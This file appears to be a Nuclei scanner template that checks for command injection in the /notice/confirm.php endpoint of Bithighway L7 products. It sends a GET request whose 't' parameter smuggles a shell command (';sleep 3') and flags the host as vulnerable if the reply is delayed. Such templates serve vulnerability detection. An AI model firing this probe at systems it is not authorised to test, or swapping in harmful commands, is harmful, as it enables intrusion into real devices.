id: Bithighway_L7_confirm_RCE

info:
  name: Bithighway_L7_confirm_RCE
  author: HK
  severity: critical
  description: 碧海威 L7多款产品/notice/confirm.php 接口存在任意命令执行漏洞
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Upgrade-Insecure-Requests: 1
    Connection: close

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 3'